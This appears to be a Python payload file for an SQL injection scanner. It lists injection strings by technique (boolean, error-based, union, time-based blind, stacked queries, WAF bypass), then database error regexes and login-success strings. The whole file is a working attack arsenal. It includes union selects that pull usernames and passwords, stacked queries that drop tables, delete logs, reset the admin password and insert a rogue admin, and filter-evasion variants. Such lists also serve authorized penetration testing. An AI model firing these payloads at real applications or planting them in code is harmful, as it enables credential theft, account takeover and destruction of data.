# SQL Injection Payloads Collection

# Basic detection payloads
BASIC_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "1' AND '1'='1",
    "1' AND 1=1 --",
    "' OR 'x'='x",
    "' OR 1=1#",
    "1' OR 1=1 --",
]

# Error-based payloads
ERROR_BASED_PAYLOADS = [
    "'",
    "\"",
    "1'",
    "1\"",
    "' AND 1=CONVERT(int, @@version) --",
    "' AND extractvalue(1, concat(0x7e, database())) --",
    "' AND updatexml(1, concat(0x7e, version()), 1) --",
    "1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
]

# Union-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    "1' UNION SELECT 1,2,3 --",
    "' UNION SELECT username, password FROM users --",
    "1' UNION SELECT table_name, column_name FROM information_schema.columns --",
]

# Boolean-based blind payloads
BOOLEAN_PAYLOADS = [
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "' AND '1'='1",
    "' AND '1'='2",
    "1' AND (SELECT 1 FROM users LIMIT 1)=1 --",
]

# Time-based blind payloads
TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5) --",
    "1' AND SLEEP(5) --",
    "' OR SLEEP(5) --",
    "1' OR SLEEP(5) --",
    "' AND BENCHMARK(10000000, MD5('a')) --",
    "' WAITFOR DELAY '00:00:05' --",
    "1' AND (SELECT * FROM (SELECT SLEEP(5))a) --",
]

# Stacked queries payloads
STACKED_PAYLOADS = [
    "'; DROP TABLE users --",
    "'; DELETE FROM logs WHERE 1=1 --",
    "'; INSERT INTO admin VALUES('hacker','pass') --",
    "'; UPDATE users SET password='hacked' WHERE username='admin' --",
]

# WAF bypass payloads
WAF_BYPASS_PAYLOADS = [
    "' OR 1=1 --",
    "' OR 1=1 #",
    "'%20OR%201=1%20--",
    "'/**/OR/**/1=1/**/--",
    "' OR 1=1 AND '1'='1",
    "1' AND '1' LIKE '1",
    "' UNION/*!50000SELECT*/1,2,3 --",
]

# All payloads combined
SQLI_PAYLOADS = (
    BASIC_PAYLOADS + 
    ERROR_BASED_PAYLOADS + 
    UNION_PAYLOADS + 
    BOOLEAN_PAYLOADS + 
    TIME_BASED_PAYLOADS + 
    STACKED_PAYLOADS + 
    WAF_BYPASS_PAYLOADS
)

# Database error patterns
DB_ERROR_PATTERNS = [
    # MySQL errors
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    
    # PostgreSQL errors
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    
    # Oracle errors
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"Oracle.*Driver",
    
    # SQL Server errors
    r"SQL Server.*Driver",
    r"Driver.*SQL Server",
    r"SQLServer JDBC Driver",
    r"Unclosed quotation mark",
    r"Incorrect syntax near",
    
    # SQLite errors
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    
    # Generic errors
    r"Unclosed quotation mark after the character string",
    r"Microsoft OLE DB Provider for ODBC Drivers",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Microsoft Access ([\w]+) Driver",
]

# Success indicators for boolean-based detection
SUCCESS_INDICATORS = [
    "Welcome",
    "Success",
    "Logged in",
    "User found",
    "Query executed",
]